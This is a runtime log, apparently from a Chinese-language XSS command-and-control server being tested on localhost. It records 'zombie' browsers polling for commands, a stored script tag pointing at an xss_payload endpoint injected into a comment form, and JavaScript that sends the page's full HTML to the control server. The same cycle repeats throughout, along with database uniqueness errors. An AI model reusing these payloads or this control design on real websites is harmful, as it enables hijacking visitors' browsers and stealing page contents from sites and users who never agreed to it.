2025-06-26 22:37:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:37:51 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:37:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:37:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:37:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:37:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:37:51 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:37:51 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:37:51.128Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:37:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0037s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:37:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:51] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:37:51 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:37:51.132048', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:37:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0041s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:37:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:51] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:37:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:37:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:37:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:37:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:37:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:37:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:37:56 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:37:56 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:37:56.128Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:37:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0036s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:37:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:56] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:37:56 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:37:56.132936', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:37:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0042s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:37:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:56] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:38:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:38:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:38:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:38:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:38:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:38:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:38:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:38:05 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:38:05 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:38:05.132309', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:38:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0024s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:38:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:38:05] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:38:05 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:38:05.128Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:38:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0056s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:38:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:38:05] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:38:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:38:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:38:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:38:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:38:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:38:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:38:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:38:31 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:38:31 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:38:31.021Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:38:31 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:38:31.026475', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:38:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0070s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:38:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0060s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:38:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:38:31] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:38:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:38:31] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:38:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:38:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:38:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:38:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:38:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:38:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:38:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:38:35 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:38:35 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:38:35.638Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:38:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0125s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:38:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:38:35] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:38:35 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:38:35.642551', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:38:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0202s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:38:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:38:35] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:38:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:38:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:38:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:38:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:38:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:38:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:38:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:38:40 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:38:40 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:38:40.645010', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:38:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0013s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:38:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:38:40] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:38:40 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:38:40.639Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:38:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0074s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:38:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:38:40] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:38:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:38:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:38:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:38:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:38:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:38:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:38:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:38:45 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:38:45 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:38:45.639Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:38:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0067s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:38:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:38:45] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:38:45 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:38:45.643702', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:38:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0097s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:38:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:38:45] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:38:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:38:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:38:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:38:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:38:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:38:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:38:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:38:50 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:38:50 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:38:50.647661', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:38:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0014s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:38:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:38:50] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:38:50 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:38:50.641Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:38:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0064s) -> 回傳: <Response 79 bytes [200 OK]>
